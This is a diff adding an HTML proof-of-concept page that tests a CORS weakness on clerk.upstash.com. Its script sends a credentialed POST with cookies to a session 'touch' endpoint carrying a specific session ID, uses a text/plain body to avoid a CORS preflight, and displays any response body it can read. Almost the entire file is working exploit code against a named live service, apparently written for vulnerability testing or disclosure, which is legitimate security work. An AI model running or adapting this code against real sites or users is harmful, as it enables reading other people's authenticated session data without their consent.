@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>CORS PoC — clerk.upstash.com</title>
+</head>
+<body>
+  <h3>CORS PoC: POST to clerk.upstash.com (with credentials)</h3>
+  <div id="out">Waiting...</div>
+
+  <script>
+    (async function() {
+      const out = msg => {
+        document.getElementById('out').innerText = msg;
+        console.log(msg);
+      };
+
+      out('Sending POST to https://clerk.upstash.com/v1/client/sessions/sess_36hWcZqfYtiyZX5BBymNd9GYeno/touch');
+
+      try {
+        // Use a simple Content-Type to avoid preflight when possible:
+        // text/plain is a "simple" header and will not trigger preflight.
+        const resp = await fetch('https://clerk.upstash.com/v1/client/sessions/sess_36hWcZqfYtiyZX5BBymNd9GYeno/touch', {
+          method: 'POST',
+          mode: 'cors',                 // allow CORS
+          credentials: 'include',       // include cookies
+          headers: {
+            'Content-Type': 'text/plain' // a simple content-type (may avoid preflight)
+          },
+          body: 'ping' // body can be empty or small text
+        });
+
+        out(`Response status: ${resp.status} ${resp.statusText}`);
+
+        // Try to read body (only if CORS allows it)
+        const text = await resp.text();
+        out(`Response body (first 1000 chars):\n${text.slice(0,1000)}`);
+      } catch (err) {
+        out('Fetch error (likely blocked by CORS or network): ' + err);
+      }
+    })();
+  </script>
+</body>
+</html>
